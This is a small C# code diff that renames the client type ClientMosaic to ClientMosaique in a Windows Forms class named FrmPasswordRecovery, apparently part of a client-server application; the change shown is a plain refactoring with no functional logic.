@@ -12,11 +12,11 @@ namespace Serveur.Views
 {
     public partial class FrmPasswordRecovery : Form
     {
-        private readonly ClientMosaic _client;
+        private readonly ClientMosaique _client;
         private readonly object _addingLock = new object();
         private readonly RecoveredAccount _noResultsFound;
 
-        public FrmPasswordRecovery(ClientMosaic client)
+        public FrmPasswordRecovery(ClientMosaique client)
         {
             _client = client;
             InitializeComponent();
